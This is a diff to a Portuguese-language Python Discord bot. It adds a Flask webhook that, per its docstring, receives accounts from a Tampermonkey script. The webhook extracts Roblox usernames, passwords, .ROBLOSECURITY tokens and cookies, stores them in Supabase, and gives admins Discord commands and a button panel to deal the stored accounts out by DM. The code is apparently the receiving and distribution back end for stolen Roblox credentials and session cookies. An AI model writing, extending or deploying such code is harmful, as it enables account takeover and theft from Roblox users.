@@ -10,7 +10,7 @@ import time
 from collections import defaultdict
 from discord import app_commands
 from discord.ext import commands
-from flask import Flask
+from flask import Flask, request
 from threading import Thread
 
 # ================ Keep-alive no Render ================
@@ -18,10 +18,79 @@ app = Flask('')
 @app.route('/')
 def home():
     return "Bot está online!"
+
+# ⬇️ COLOQUE A ROTA DO WEBHOOK AQUI ⬇️
+@app.route('/webhook/roblox', methods=['POST'])
+def webhook_roblox():
+    """Recebe contas do script Tampermonkey"""
+    try:
+        data = request.json
+        
+        if 'embeds' in data:
+            embed = data['embeds'][0]
+            fields = embed.get('fields', [])
+            
+            usuario = None
+            senha = None
+            cookie = None
+            roblosecurity = None
+            
+            for field in fields:
+                name = field.get('name', '').lower()
+                value = field.get('value', '').replace('```', '').replace('||', '').replace('`', '').strip()
+                
+                if 'usuário' in name or 'usuario' in name:
+                    usuario = value
+                elif 'senha' in name:
+                    senha = value
+                elif 'roblosecurity' in name and 'não encontrado' not in value.lower():
+                    roblosecurity = value
+                elif 'cookie' in name and 'string' in name.lower():
+                    cookie = value
+            
+            if usuario and senha:
+                with httpx.Client() as client:
+                    client.post(
+                        f"{SUPABASE_URL}/rest/v1/contas_roblox",
+                        headers={
+                            "apikey": SUPABASE_KEY,
+                            "Authorization": f"Bearer {SUPABASE_KEY}",
+                            "Content-Type": "application/json",
+                            "Prefer": "return=minimal"
+                        },
+                        json={
+                            "usuario": usuario,
+                            "senha": senha,
+                            "cookie": cookie,
+                            "roblosecurity": roblosecurity,
+                            "data_criacao": datetime.datetime.now().isoformat(),
+                            "usada": False,
+                            "usada_por": None
+                        }
+                    )
+                print(f"✅ Conta recebida via webhook: {usuario}")
+                return {"status": "ok"}, 200
+    
+    except Exception as e:
+        print(f"❌ Erro webhook: {e}")
+    
+    return {"status": "error"}, 400
+
 def run():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 3000)))
+
 def keep_alive():
     Thread(target=run).start()
+
+# ================ CONFIGURAÇÕES ================
+intents = discord.Intents.default()
+intents.message_content = True
+intents.members = True
+bot = commands.Bot(command_prefix='/', intents=intents, help_command=None)
+
+SUPABASE_URL = os.environ.get('SUPABASE_URL')
+SUPABASE_KEY = os.environ.get('SUPABASE_KEY')
+DONO_ID = 1157833912123404358  # Seu ID
 
 # ================ Configurações do bot ================
 intents = discord.Intents.default()
@@ -277,6 +346,318 @@ async def restricao_canal_interaction(interaction: discord.Interaction) -> bool:
     except (discord.Forbidden, discord.HTTPException):
         pass
     return False
+
+async def carregar_adms():
+    """Carrega a lista de ADMs autorizados do Supabase"""
+    async with httpx.AsyncClient() as client:
+        response = await client.get(
+            f"{SUPABASE_URL}/rest/v1/adms_roblox?select=user_id",
+            headers={
+                "apikey": SUPABASE_KEY,
+                "Authorization": f"Bearer {SUPABASE_KEY}"
+            }
+        )
+        if response.status_code == 200:
+            data = response.json()
+            adms = [row['user_id'] for row in data]
+            if DONO_ID not in adms:
+                adms.append(DONO_ID)
+            return adms
+        return [DONO_ID]
+
+async def salvar_adm(user_id):
+    async with httpx.AsyncClient() as client:
+        response = await client.get(
+            f"{SUPABASE_URL}/rest/v1/adms_roblox?user_id=eq.{user_id}&select=id",
+            headers={"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
+        )
+        if response.json():
+            return
+        await client.post(
+            f"{SUPABASE_URL}/rest/v1/adms_roblox",
+            headers={
+                "apikey": SUPABASE_KEY,
+                "Authorization": f"Bearer {SUPABASE_KEY}",
+                "Content-Type": "application/json",
+                "Prefer": "return=minimal"
+            },
+            json={"user_id": user_id}
+        )
+
+async def remover_adm(user_id):
+    async with httpx.AsyncClient() as client:
+        await client.delete(
+            f"{SUPABASE_URL}/rest/v1/adms_roblox?user_id=eq.{user_id}",
+            headers={
+                "apikey": SUPABASE_KEY,
+                "Authorization": f"Bearer {SUPABASE_KEY}",
+                "Prefer": "return=minimal"
+            }
+        )
+
+async def eh_adm(user_id):
+    adms = await carregar_adms()
+    return user_id in adms
+
+async def adicionar_conta(usuario, senha, cookie=None, roblosecurity=None):
+    async with httpx.AsyncClient() as client:
+        await client.post(
+            f"{SUPABASE_URL}/rest/v1/contas_roblox",
+            headers={
+                "apikey": SUPABASE_KEY,
+                "Authorization": f"Bearer {SUPABASE_KEY}",
+                "Content-Type": "application/json",
+                "Prefer": "return=minimal"
+            },
+            json={
+                "usuario": usuario,
+                "senha": senha,
+                "cookie": cookie,
+                "roblosecurity": roblosecurity,
+                "data_criacao": datetime.datetime.now().isoformat(),
+                "usada": False,
+                "usada_por": None
+            }
+        )
+
+async def pegar_conta(user_id):
+    async with httpx.AsyncClient() as client:
+        response = await client.get(
+            f"{SUPABASE_URL}/rest/v1/contas_roblox?usada=eq.false&limit=1&select=*",
+            headers={"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
+        )
+        data = response.json()
+        if not data:
+            return None
+        conta = data[0]
+        await client.patch(
+            f"{SUPABASE_URL}/rest/v1/contas_roblox?id=eq.{conta['id']}",
+            headers={
+                "apikey": SUPABASE_KEY,
+                "Authorization": f"Bearer {SUPABASE_KEY}",
+                "Content-Type": "application/json",
+                "Prefer": "return=minimal"
+            },
+            json={
+                "usada": True,
+                "usada_por": user_id,
+                "data_uso": datetime.datetime.now().isoformat()
+            }
+        )
+        return conta
+
+async def contar_disponiveis():
+    async with httpx.AsyncClient() as client:
+        response = await client.get(
+            f"{SUPABASE_URL}/rest/v1/contas_roblox?usada=eq.false&select=id",
+            headers={"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
+        )
+        return len(response.json()) if response.status_code == 200 else 0
+
+async def contar_total():
+    async with httpx.AsyncClient() as client:
+        response = await client.get(
+            f"{SUPABASE_URL}/rest/v1/contas_roblox?select=id",
+            headers={"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
+        )
+        return len(response.json()) if response.status_code == 200 else 0
+
+async def carregar_config():
+    async with httpx.AsyncClient() as client:
+        response = await client.get(
+            f"{SUPABASE_URL}/rest/v1/config_roblox?limit=1&select=*",
+            headers={"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
+        )
+        data = response.json()
+        return data[0] if data else {}
+
+async def salvar_config(message_id, channel_id):
+    async with httpx.AsyncClient() as client:
+        await client.delete(
+            f"{SUPABASE_URL}/rest/v1/config_roblox?select=id",
+            headers={"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Prefer": "return=minimal"}
+        )
+        await client.post(
+            f"{SUPABASE_URL}/rest/v1/config_roblox",
+            headers={
+                "apikey": SUPABASE_KEY,
+                "Authorization": f"Bearer {SUPABASE_KEY}",
+                "Content-Type": "application/json",
+                "Prefer": "return=minimal"
+            },
+            json={"painel_message_id": message_id, "painel_channel_id": channel_id}
+        )
+
+# ================ VIEW DO PAINEL ================
+class PainelRobloxView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+    
+    @discord.ui.button(
+        label="🎮 Pedir Conta", 
+        style=discord.ButtonStyle.green, 
+        custom_id="pedir_conta_roblox",
+        emoji="🎮"
+    )
+    async def pedir_conta(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not await eh_adm(interaction.user.id):
+            await interaction.response.send_message("❌ Acesso negado!", ephemeral=True)
+            return
+        
+        disponiveis = await contar_disponiveis()
+        
+        if disponiveis <= 0:
+            embed_erro = discord.Embed(
+                title="📭 ESTOQUE VAZIO!",
+                description=f"😔 Não há contas disponíveis.\n📢 Peça a <@{DONO_ID}> para reabastecer!",
+                color=discord.Color.red()
+            )
+            await interaction.response.send_message(embed=embed_erro, ephemeral=True)
+            return
+        
+        await interaction.response.defer(ephemeral=True)
+        conta = await pegar_conta(interaction.user.id)
+        
+        if not conta:
+            await interaction.followup.send("❌ Erro ao pegar conta.", ephemeral=True)
+            return
+        
+        embed_dm = discord.Embed(
+            title="🎮 Sua Conta Roblox",
+            description="✅ Guarde com segurança!",
+            color=discord.Color.green()
+        )
+        embed_dm.add_field(name="👤 Usuário", value=f"```{conta['usuario']}```", inline=True)
+        embed_dm.add_field(name="🔑 Senha", value=f"```{conta['senha']}```", inline=True)
+        
+        if conta.get('roblosecurity'):
+            embed_dm.add_field(name="🔐 .ROBLOSECURITY", value=f"```{conta['roblosecurity'][:100]}...```", inline=False)
+        if conta.get('cookie'):
+            embed_dm.add_field(name="🍪 Cookie", value=f"```{conta['cookie'][:200]}...```", inline=False)
+        
+        try:
+            await interaction.user.send(embed=embed_dm)
+            await interaction.followup.send("✅ Conta enviada na sua DM!", ephemeral=True)
+        except:
+            await interaction.followup.send(embed=embed_dm, ephemeral=True)
+        
+        await atualizar_painel(interaction)
+
+async def atualizar_painel(interaction=None):
+    if not interaction:
+        return
+    config = await carregar_config()
+    message_id = config.get('painel_message_id')
+    channel_id = config.get('painel_channel_id')
+    disponiveis = await contar_disponiveis()
+    total = await contar_total()
+    embed = criar_embed_painel(disponiveis, total)
+    
+    if message_id and channel_id:
+        try:
+            channel = interaction.guild.get_channel(channel_id)
+            if channel:
+                message = await channel.fetch_message(message_id)
+                await message.edit(embed=embed, view=PainelRobloxView())
+        except:
+            pass
+
+def criar_embed_painel(disponiveis, total):
+    if total > 0:
+        porcentagem = disponiveis / total
+        barras_cheias = int(porcentagem * 20)
+        barras_vazias = 20 - barras_cheias
+        barra = "🟢" * barras_cheias + "⚫" * barras_vazias
+    else:
+        porcentagem = 0
+        barra = "⚫" * 20
+    
+    embed = discord.Embed(
+        title="🤖 ROBLOX ACCOUNTS",
+        description=f"```\n┌─────────────────────────┐\n│                         │\n│   Contas Disponíveis    │\n│                         │\n│         {disponiveis:03d}             │\n│                         │\n└─────────────────────────┘\n```",
+        color=discord.Color.blue() if disponiveis > 10 else discord.Color.orange() if disponiveis > 0 else discord.Color.red()
+    )
+    embed.add_field(name="📊 Estatísticas", value=f"📦 Total: {total}\n✅ Disponíveis: {disponiveis}\n🎁 Entregues: {total - disponiveis}", inline=True)
+    embed.add_field(name="📈 Status", value=f"{barra}\n{int(porcentagem * 100)}% disponível", inline=False)
+    
+    if disponiveis == 0:
+        embed.add_field(name="🚨 ALERTA", value=f"Estoque zerado! Peça a <@{DONO_ID}> para reabastecer.", inline=False)
+    elif disponiveis <= 5:
+        embed.add_field(name="⚠️ Atenção", value="Estoque quase acabando!", inline=False)
+    
+    embed.set_footer(text="Clique no botão abaixo • Apenas ADMs")
+    return embed
+
+# ================ COMANDOS SLASH ================
+
+@bot.tree.command(name="painel", description="📦 Cria o painel de contas Roblox (apenas dono)")
+async def slash_painel(interaction: discord.Interaction):
+    if interaction.user.id != DONO_ID:
+        return await interaction.response.send_message("❌ Apenas o dono!", ephemeral=True)
+    
+    disponiveis = await contar_disponiveis()
+    total = await contar_total()
+    embed = criar_embed_painel(disponiveis, total)
+    view = PainelRobloxView()
+    
+    await interaction.response.send_message(embed=embed, view=view)
+    message = await interaction.original_response()
+    await salvar_config(message.id, interaction.channel.id)
+
+@bot.tree.command(name="addconta", description="➕ Adiciona conta manualmente")
+@app_commands.describe(usuario="Usuário Roblox", senha="Senha", roblosecurity=".ROBLOSECURITY (opicional)", cookie="Cookie (opicional)")
+async def slash_addconta(interaction: discord.Interaction, usuario: str, senha: str, roblosecurity: str = None, cookie: str = None):
+    if not await eh_adm(interaction.user.id):
+        return await interaction.response.send_message("❌ Acesso negado!", ephemeral=True)
+    
+    await adicionar_conta(usuario, senha, cookie, roblosecurity)
+    await interaction.response.send_message(f"✅ Conta `{usuario}` adicionada!", ephemeral=True)
+    await atualizar_painel(interaction)
+
+@bot.tree.command(name="estoque", description="📦 Mostra o estoque")
+async def slash_estoque(interaction: discord.Interaction):
+    if not await eh_adm(interaction.user.id):
+        return await interaction.response.send_message("❌ Acesso negado!", ephemeral=True)
+    
+    embed = criar_embed_painel(await contar_disponiveis(), await contar_total())
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="admroblox", description="👑 Gerencia ADMs (apenas dono)")
+@app_commands.describe(acao="Ação", usuario="Usuário")
+@app_commands.choices(acao=[
+    app_commands.Choice(name="➕ Adicionar", value="add"),
+    app_commands.Choice(name="➖ Remover", value="remove"),
+    app_commands.Choice(name="📋 Listar", value="list")
+])
+async def slash_admroblox(interaction: discord.Interaction, acao: str, usuario: discord.User = None):
+    if interaction.user.id != DONO_ID:
+        return await interaction.response.send_message("❌ Apenas o dono!", ephemeral=True)
+    
+    if acao == "list":
+        adms = await carregar_adms()
+        embed = discord.Embed(title="👑 ADMs Roblox", color=discord.Color.gold())
+        for adm_id in adms:
+            user = interaction.guild.get_member(adm_id)
+            nome = user.display_name if user else f"ID {adm_id}"
+            coroa = "👑" if adm_id == DONO_ID else "🔹"
+            embed.add_field(name=f"{coroa} {nome}", value=f"`{adm_id}`", inline=False)
+        return await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    if not usuario:
+        return await interaction.response.send_message("❌ Mencione um usuário!", ephemeral=True)
+    
+    if acao == "add":
+        if await eh_adm(usuario.id):
+            return await interaction.response.send_message(f"❌ {usuario.mention} já é ADM!", ephemeral=True)
+        await salvar_adm(usuario.id)
+        await interaction.response.send_message(f"✅ {usuario.mention} agora é ADM!", ephemeral=True)
+    elif acao == "remove":
+        if not await eh_adm(usuario.id):
+            return await interaction.response.send_message(f"❌ {usuario.mention} não é ADM!", ephemeral=True)
+        if usuario.id == DONO_ID:
+            return await interaction.response.send_message("❌ Não pode remover o dono!", ephemeral=True)
+        await remover_adm(usuario.id)
+        await interaction.response.send_message(f"✅ {usuario.mention} removido!", ephemeral=True)
 
 # ================ COMANDO EXCLUSIVO PARA ADICIONAR XP ================
 USUARIO_PERMITIDO_XP = 1157833912123404358  # Apenas este ID pode usar
